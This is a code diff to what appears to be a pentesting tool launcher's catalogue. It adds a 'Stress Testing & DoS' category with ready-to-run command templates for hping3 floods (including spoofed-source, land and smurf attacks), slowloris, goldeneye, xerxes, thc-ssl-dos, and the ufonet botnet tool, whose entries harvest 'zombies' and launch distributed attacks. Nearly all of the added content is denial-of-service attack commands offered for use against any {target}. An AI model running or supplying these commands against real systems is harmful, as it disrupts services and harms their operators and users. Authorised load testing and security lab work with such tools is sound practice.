@@ -54,6 +54,11 @@ TOOL_CATEGORIES = {
         "icon": "bug",
         "color": "#d35400"
     },
+    "stress_testing": {
+        "name": "Stress Testing & DoS",
+        "icon": "bolt",
+        "color": "#ff4757"
+    },
     "system": {
         "name": "System & Utilities",
         "icon": "terminal",
@@ -605,6 +610,92 @@ TOOLS = [
         "keywords": ["auto", "scan", "legion", "pentest", "recon"],
         "common_commands": [
             {"label": "Launch Legion", "cmd": "legion"},
+        ]
+    },
+
+    # ── Stress Testing & DoS ──
+    {
+        "name": "hping3",
+        "category": "stress_testing",
+        "package": "hping3",
+        "description": "TCP/IP packet assembler and analyzer — SYN/UDP/ICMP floods",
+        "needs_root": True,
+        "keywords": ["stress", "flood", "dos", "ddos", "syn", "udp", "icmp", "hping", "packet", "attack", "test", "load"],
+        "common_commands": [
+            {"label": "SYN flood port 80", "cmd": "hping3 -S --flood -V -p 80 {target}"},
+            {"label": "SYN flood custom port", "cmd": "hping3 -S --flood -V -p {port} {target}"},
+            {"label": "UDP flood", "cmd": "hping3 --udp --flood -p 53 {target}"},
+            {"label": "ICMP flood", "cmd": "hping3 --icmp --flood {target}"},
+            {"label": "SYN + random source", "cmd": "hping3 -S --flood --rand-source -p 80 {target}"},
+            {"label": "Christmas tree attack", "cmd": "hping3 --flood -FSRPAU -p 80 {target}"},
+            {"label": "Land attack", "cmd": "hping3 -S -a {target} -p 80 --flood {target}"},
+            {"label": "Smurf attack", "cmd": "hping3 --icmp --flood -a {target} {subnet}"},
+            {"label": "SYN scan (port range)", "cmd": "hping3 -S {target} -p 1-1000 --scan"},
+            {"label": "Data payload flood", "cmd": "hping3 -S --flood -d 1200 -p 80 {target}"},
+        ]
+    },
+    {
+        "name": "slowloris",
+        "category": "stress_testing",
+        "package": "slowloris",
+        "description": "Low-bandwidth HTTP DoS — keeps connections open to exhaust server",
+        "needs_root": False,
+        "keywords": ["slowloris", "http", "dos", "slow", "connections", "web", "apache", "stress", "flood", "exhaust"],
+        "common_commands": [
+            {"label": "HTTP slowloris (500 sockets)", "cmd": "slowloris {target} -p 80 -s 500"},
+            {"label": "HTTPS slowloris", "cmd": "slowloris {target} -p 443 -s 500 --https"},
+            {"label": "Custom port + sockets", "cmd": "slowloris {target} -p {port} -s 1000"},
+            {"label": "Stealth (slow rate)", "cmd": "slowloris {target} -p 80 -s 200 --sleeptime 10"},
+        ]
+    },
+    {
+        "name": "ufonet",
+        "category": "stress_testing",
+        "package": "ufonet",
+        "description": "DDoS botnet tool — uses open redirects as amplifiers",
+        "needs_root": False,
+        "keywords": ["ufonet", "ddos", "botnet", "amplify", "redirect", "dos", "distributed", "attack", "stress"],
+        "common_commands": [
+            {"label": "Attack target", "cmd": "ufonet -a {target} -r 500 --threads 200"},
+            {"label": "Search zombies", "cmd": "ufonet -s '{target}' --sa"},
+            {"label": "Download zombies", "cmd": "ufonet --download-zombies"},
+            {"label": "Attack with all methods", "cmd": "ufonet -a {target} -r 1000 --threads 500 --db"},
+        ]
+    },
+    {
+        "name": "goldeneye",
+        "category": "stress_testing",
+        "package": "goldeneye",
+        "description": "HTTP DoS tool — keep-alive + cache bypass flood",
+        "needs_root": False,
+        "keywords": ["goldeneye", "http", "dos", "flood", "stress", "web", "keepalive", "test"],
+        "common_commands": [
+            {"label": "HTTP flood", "cmd": "goldeneye http://{target} -w 50 -s 500"},
+            {"label": "Custom workers", "cmd": "goldeneye http://{target} -w 100 -s 1000 -m random"},
+        ]
+    },
+    {
+        "name": "xerxes",
+        "category": "stress_testing",
+        "package": "xerxes",
+        "description": "Powerful DoS tool for stress testing web servers",
+        "needs_root": False,
+        "keywords": ["xerxes", "dos", "flood", "stress", "web", "server", "test"],
+        "common_commands": [
+            {"label": "Attack target", "cmd": "xerxes {target} 80"},
+            {"label": "Custom port", "cmd": "xerxes {target} {port}"},
+        ]
+    },
+    {
+        "name": "thc-ssl-dos",
+        "category": "stress_testing",
+        "package": "thc-ssl-dos",
+        "description": "SSL/TLS renegotiation DoS — exploits SSL handshake cost",
+        "needs_root": False,
+        "keywords": ["ssl", "tls", "dos", "renegotiation", "https", "stress", "thc", "handshake"],
+        "common_commands": [
+            {"label": "SSL DoS", "cmd": "thc-ssl-dos {target} 443 --accept"},
+            {"label": "Custom port", "cmd": "thc-ssl-dos {target} {port} --accept"},
         ]
     },
 
